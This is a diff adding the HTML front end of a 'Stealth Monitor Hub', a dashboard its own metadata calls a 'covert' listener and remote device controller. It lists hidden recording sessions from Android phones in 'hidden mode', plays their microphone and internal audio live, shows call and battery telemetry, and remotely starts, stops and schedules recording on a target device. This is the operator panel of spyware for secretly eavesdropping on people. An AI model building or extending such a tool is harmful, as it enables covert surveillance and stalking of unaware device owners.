@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Audio Stream — Stealth Monitor Hub</title>
+    <meta name="description" content="Covert live audio player, telemetry monitor, and remote device controller.">
+    <meta name="theme-color" content="#090912">
+
+    <!-- Google Fonts & HLS.js -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🕵️</text></svg>">
+</head>
+<body>
+
+    <div class="app">
+
+        <!-- Top Header -->
+        <header class="header">
+            <div class="header__brand">
+                <div class="logo-icon">🕵️</div>
+                <div>
+                    <h1 class="header__title">Stealth Monitor Hub</h1>
+                    <div class="header__status" id="server-status">
+                        <span class="status-dot status-dot--online"></span>
+                        <span id="status-text">Server Live (Hidden Pipeline)</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- View Mode Switcher -->
+            <div class="view-switch">
+                <button class="switch-btn active" id="tab-all">⚡ Split View</button>
+                <button class="switch-btn" id="tab-player">🎧 Live Player</button>
+                <button class="switch-btn" id="tab-dashboard">📊 Hidden Sessions</button>
+                <a href="/" class="switch-btn" style="text-decoration: none; display: flex; align-items: center; gap: 4px;">📁 Main Hub</a>
+            </div>
+        </header>
+
+        <!-- Stats Chips Bar -->
+        <div class="stats-bar" id="stats-bar">
+            <div class="stat-card stat-card--accent">
+                <span class="stat-card__val" id="stat-active">0</span>
+                <span class="stat-card__lbl">Live Now</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-card__val" id="stat-sessions">0</span>
+                <span class="stat-card__lbl">Hidden Sessions</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-card__val" id="stat-chunks">0</span>
+                <span class="stat-card__lbl">Total Chunks</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-card__val" id="stat-duration">00:00</span>
+                <span class="stat-card__lbl">Total Duration</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-card__val" id="stat-storage">0 B</span>
+                <span class="stat-card__lbl">Storage Used</span>
+            </div>
+        </div>
+
+        <!-- Main Layout Grid -->
+        <main class="grid-container" id="grid-container">
+
+            <!-- LEFT COLUMN: LIVE PLAYER & REMOTE CONTROL -->
+            <div class="col-left" id="col-left">
+                <!-- LIVE PLAYER SECTION -->
+                <section class="section-card section-card--player" id="sec-player">
+                    <div class="card-head">
+                        <div class="card-head__info">
+                            <h2 class="card-title">🎧 Real-Time Live Player</h2>
+                            <div class="card-sub">0ms remote audio stream listener</div>
+                        </div>
+                        <span class="live-pill" id="live-indicator">OFFLINE</span>
+                    </div>
+
+                    <!-- Device Selector Dropdown -->
+                    <div class="selector-box">
+                        <label for="session-select" class="field-label">SELECT LIVE STREAMING DEVICE</label>
+                        <select id="session-select" class="select-field">
+                            <option value="">Searching for live hidden streams...</option>
+                        </select>
+                    </div>
+
+                    <!-- Audio Visualizer Canvas -->
+                    <div class="visualizer-wrapper">
+                        <canvas id="visualizer" width="600" height="140"></canvas>
+                        <div class="visualizer-overlay" id="visualizer-overlay">Select a live device to start listening</div>
+                    </div>
+
+                    <!-- Track Info -->
+                    <div class="track-info">
+                        <div class="track-info__name" id="track-name">No Device Playing</div>
+                        <div class="track-info__meta" id="track-meta">Connect an Android device in hidden mode</div>
+                    </div>
+
+                    <!-- Progress & Seek Bar -->
+                    <div class="progress-section">
+                        <div class="progress-bar-container" id="progress-bar-container">
+                            <div class="progress-buffer" id="progress-buffer"></div>
+                            <div class="progress-fill" id="progress-fill"></div>
+                        </div>
+                        <div class="time-row">
+                            <span id="time-current">00:00</span>
+                            <button class="live-badge-btn" id="btn-jump-live">● LIVE</button>
+                            <span id="time-total">00:00</span>
+                        </div>
+                    </div>
+
+                    <!-- Controls & Speed Row -->
+                    <div class="controls-row">
+                        <button class="ctrl-btn ctrl-btn--rewind" id="btn-rewind" title="Rewind 15 Seconds" disabled>
+                            ⏮ 15s
+                        </button>
+                        <button class="ctrl-btn ctrl-btn--play" id="btn-play" title="Play / Pause" disabled>
+                            <span id="icon-play">▶ PLAY</span>
+                            <span id="icon-pause" style="display:none;">⏸ PAUSE</span>
+                        </button>
+                        <div class="speed-box">
+                            <label for="speed-select" class="speed-label">⚡ Speed</label>
+                            <select id="speed-select" class="speed-select">
+                                <option value="0.5">0.5x</option>
+                                <option value="1.0" selected>1.0x</option>
+                                <option value="1.25">1.25x</option>
+                                <option value="1.5">1.5x</option>
+                                <option value="2.0">2.0x</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Channel Panner Controls -->
+                    <div class="channel-row">
+                        <span class="field-label">AUDIO CHANNEL:</span>
+                        <div class="channel-btn-group">
+                            <button class="channel-btn active" id="btn-chan-both">🎛️ Both (Stereo)</button>
+                            <button class="channel-btn" id="btn-chan-left">🎙️ Mic Only (L)</button>
+                            <button class="channel-btn" id="btn-chan-right">🎵 Internal Only (R)</button>
+                        </div>
+                    </div>
+
+                    <!-- Latency, Telemetry & Status Row -->
+                    <div class="player-status-row">
+                        <span class="status-badge" id="player-state-badge">State: Idle</span>
+                        <span class="status-badge" id="telemetry-call-badge">📞 Call: Idle</span>
+                        <span class="status-badge" id="telemetry-mic-badge">🎙️ Mic: Clear</span>
+                        <span class="status-badge" id="telemetry-battery-badge">🔋 Battery: --%</span>
+                        <span class="status-badge" id="telemetry-route-badge">🔊 Output: Unknown</span>
+                        <span class="status-badge" id="latency-badge">Latency: --s</span>
+                    </div>
+
+                    <!-- Hidden Audio Element -->
+                    <audio id="audio-player" crossorigin="anonymous" preload="none"></audio>
+                </section>
+
+                <!-- REMOTE DEVICE CONTROLLER -->
+                <section class="section-card section-card--remote" id="sec-remote">
+                    <div class="card-head">
+                        <div class="card-head__info">
+                            <h2 class="card-title">📡 Remote Device Controller</h2>
+                            <div class="card-sub">Send instant 0ms signals via WebSocket & dynamic alarms</div>
+                        </div>
+                    </div>
+                    <div class="remote-controls">
+                        <div class="selector-box">
+                            <label for="remote-client-select" class="field-label">TARGET DEVICE</label>
+                            <select id="remote-client-select" class="select-field">
+                                <option value="">Select Device...</option>
+                            </select>
+                        </div>
+                        <div class="remote-btn-row">
+                            <button class="btn btn--remote-start" id="btn-remote-start">
+                                <span>▶️</span> Remote Start Recording
+                            </button>
+                            <button class="btn btn--remote-stop" id="btn-remote-stop">
+                                <span>⏹️</span> Remote Stop Recording
+                            </button>
+                        </div>
+                        <div class="schedule-box" id="schedule-box" style="margin-top: 15px; display: flex; gap: 10px; align-items: flex-end;">
+                            <div style="flex: 1;">
+                                <label for="remote-start-time" class="field-label">AUTO-START TIME (HH:MM)</label>
+                                <input type="time" id="remote-start-time" class="select-field" style="width: 100%;">
+                            </div>
+                            <div style="flex: 1;">
+                                <label for="remote-stop-time" class="field-label">AUTO-STOP TIME (HH:MM)</label>
+                                <input type="time" id="remote-stop-time" class="select-field" style="width: 100%;">
+                            </div>
+                            <button class="btn btn--secondary" id="btn-remote-schedule" style="padding: 12px 15px;">Set Schedule</button>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- RIGHT COLUMN: SESSIONS LIST -->
+            <div class="col-right" id="col-right">
+                <section class="section-card section-card--dashboard" id="sec-dashboard">
+                    <div class="card-head">
+                        <div>
+                            <h2 class="card-title" style="color: #a78bfa;">🕵️ Hidden Broadcast Sessions</h2>
+                            <div class="card-sub" id="session-count">0 sessions recorded</div>
+                        </div>
+                        <button class="btn-refresh" id="btn-refresh" title="Refresh list">🔄</button>
+                    </div>
+
+                    <div class="filter-box">
+                        <select id="client-filter" class="select-field select-field--sm">
+                            <option value="">All Devices / Clients</option>
+                        </select>
+                    </div>
+
+                    <div class="session-list-container">
+                        <ul class="session-list" id="session-list">
+                            <li class="empty-state">Loading hidden sessions...</li>
+                        </ul>
+                    </div>
+                </section>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- Delete Confirmation Modal -->
+    <div class="modal-overlay" id="modal-overlay">
+        <div class="modal">
+            <div class="modal__icon">🗑️</div>
+            <div class="modal__title">Delete Recording Session?</div>
+            <div class="modal__desc">This will permanently delete all audio chunks and HLS streams for this session.</div>
+            <div class="modal__id" id="modal-session-id"></div>
+            <div class="modal__actions">
+                <button class="btn btn--secondary" id="modal-cancel">Cancel</button>
+                <button class="btn btn--danger" id="modal-confirm">Delete Permanently</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Downloader Modal -->
+    <div class="modal-overlay" id="modal-downloader-overlay">
+        <div class="modal" style="max-width: 95%; width: 540px; padding: 0; background: transparent; box-shadow: none;">
+            <div style="display: flex; justify-content: flex-end; padding: 10px;">
+                <button id="btn-close-downloader" style="background: rgba(0,0,0,0.5); border: none; color: white; font-size: 1.5rem; cursor: pointer; border-radius: 50%; width: 32px; height: 32px;">&times;</button>
+            </div>
+            <iframe id="downloader-iframe" src="" style="width: 100%; height: 80vh; border: none; border-radius: 12px; background: transparent;"></iframe>
+        </div>
+    </div>
+
+    <div class="toast-container" id="toast-container"></div>
+
+    <script src="/hidden.js"></script>
+</body>
+</html>
